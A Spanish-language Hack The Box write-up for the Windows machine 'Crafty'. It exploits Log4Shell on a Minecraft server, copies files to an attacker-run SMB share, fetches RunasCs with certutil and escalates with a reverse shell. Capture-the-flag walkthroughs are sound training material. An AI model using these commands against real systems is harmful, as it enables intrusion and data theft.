
--- 
- Tags: #HTB #Easy #windows #java 
- --

#### QUÉ SE EXPLOTA?

Minecraft Exploitation - Log4Shell (RCE)
JAR Plugin Analysis with JD-GUI + Information Leakage
Using RunasCs to execute commands as administrator [Privilege Escalation]

#### Write UP

##### PRIMERA FASE: Reconocimiento

Cómo siempre empezamos esta fase haciendo los **escaneos de rutina** empleamos 2 escaneos, a veces más. **El primero nos va a servir para descubrir los puertos abiertos*** mientras que en el segundo escaneo lo ocupamos para detrminar más detalles sobre **los puertos** previamente escaneados. 

![](../imgs/Pasted image 20251103111050.png)

**Desde el escaneo vemos que nmap** nos quiere redirigir a un dominio que no encuentra por lo que **tenemos que agregarlo al [[etc-hosts]]**. 

**El servidor de minecraft** efectivamente corre por el puerto 26565.
![](../imgs/Pasted image 20251103111330.png)

**Proseguimos a analizar la página web** para ver si encontramos algo interesante. 

![](../imgs/Pasted image 20251103111429.png)

La pagina en sí no era funcional y únicamente nos decía que para jugar fueramos a un subdominio. **play.crafty.htb** por lo cual **proseguimos a agregarlo a [[etc-hosts]]**. Al tratar de entrar al nuevo **subdominio** nos redirigía a **crafty.htb** 

**Hicimos [[Fuzzing]]** pero, no encontramos nada y por último tuvimos que descargar un **cliente** para poder conectarnos al servidor de minecraft, **descargamos un cliente de minecraft para consola en [github](https://github.com/MCCTeam/Minecraft-Console-Client/releases)** y nos conectamos al servidor. 

##### SEGUNDA FASE: Explotación. 

**Para esta fase encontramos una vulnerabilidad en minecraft**. La vulneravilidad se trata de **[[CVE-2021-44228]]**


![](../imgs/Pasted image 20251103170047.png)

![](../imgs/Pasted image 20251103171054.png)

**Para cmd.exe (lo que configuaramos en el script ya que pedía una */bin/sh* pero estamos en windows)**  utilizamos **rl wrap**.

Dentro de la maquina obtuvimos la **user.txt** y seguimos investigando para ver que podíamos obtener.

![](../imgs/Pasted image 20251103172926.png)

**Dentro de la carpeta *server*** había unos archivos interesantes, por lo que proseguimos a analizarlos con [[jd-gui]]. 

**Para transferir archivos en windows tenemos que jugar con..**

```bash

impacket-smbserver smbFolder $(pwd) -smb2support -username eyn -password admin
```
![](../imgs/Pasted image 20251103173754.png)
**Nos sirve para exponer una carpeta que se llamará *smbFolder* y estará ligada a nuestra ruta actual de trabajo ($(pwd)), indicamos la versión y el usuario y la contraseña** 

Desde el lado de la victima nos conectamos a nuestro servidor **smb** para de esa forma tener accesso a la carpeta que se está compartiendo...

```cmd

net use \\nuestra_ip\carpeta_compartida /u:usuario passwd
```

![](../imgs/Pasted image 20251103173726.png)

**Nos copiamos el archivo que encontramos en *plugins* dentro de server**

```cmd

copy nombre_archivo \\nuestra_ip\carpeta_compartida\nombre_de_archivo
```

![](../imgs/Pasted image 20251103174142.png)

**Teniendo los archvios en nuetra maquina ahora sí los analizamos con [[jd-gui]]** 

Enconatramos una posible contraseña:

![](../imgs/Pasted image 20251103175025.png)


Por lo que proseguimos a tratar de conectarnos como **administrator** a ver si esa contraseña jalaba. 

##### TERCERA FASE: PostExplotación - Privesc


**Creamos un directorio en la ruta c:\\Windows\temp** y ahí trabajamos

**Para eso utilizamos [[RunasCs]].** Nos transferimos el archivo con...
```cmd

certutil -urlcache -split -f http://nuestra_ip/ruta_archivo ruta_de_destino
```

![](../imgs/Pasted image 20251103182141.png)

Usamos la opción para enviarnos una **[[Reverse shell]]** y lo ejecutamos.

![](../imgs/Pasted image 20251103182221.png)
![](../imgs/Pasted image 20251103182318.png)


**Listo** Obtuvimos la User Flag. 


